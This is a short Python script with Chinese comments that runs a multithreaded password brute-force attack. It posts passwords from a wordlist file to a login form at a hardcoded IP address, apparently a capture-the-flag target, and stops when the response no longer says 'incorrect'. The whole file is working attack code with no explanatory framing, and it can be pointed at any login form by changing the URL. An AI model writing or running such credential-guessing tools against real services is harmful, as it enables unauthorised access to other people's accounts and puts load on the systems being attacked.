import requests, re
import threading
import urllib.request


url = 'http://120.24.86.145:8002/xiaoming/?yes'
login = 'http://120.24.86.145:8002/xiaoming/?yes'
s = requests.session()
c = s.get(url).content.decode('utf-8')


lock = threading.Lock()

curTask = 1
maxTask = 1700
flag = False
right = ''

f = open('test.txt', 'r')
def thread():
    global lock
    global curTask
    global maxTask
    global right
    global flag

    while not flag:  # 当flag为假也就是正确密码还没出来时，不断取任务来完成
        lock.acquire()  # 取任务  #这个过程不能被打断
        myTask = curTask
        curTask = curTask + 1
        a = f.readline()
        a = a.strip('\n')
        lock.release()

        if myTask >= maxTask:  # 所有任务已经完成就退出
            break


        data = {'pwd': a}
        #print(data)
        c1 = s.post(login, data=data).content.decode('utf-8')
        #print(str(myTask) + ':' + c1)

        lock.acquire()  # 取任务  #这个过程不能被打断
        print(myTask,a)

        lock.release()

        #print(myTask,data)


        if '不正确' not in c1:
            right = str(a) + ', ' + c1
            flag=True




# 多线程执行
threadNum = 100
threadlist = []
for i in range(threadNum):
    threadlist.append(threading.Thread(target=thread))

for i in threadlist:
    i.start()
for i in threadlist:
    i.join()

# 最终输出正确结果
print('pwd is ' + right)
f.close()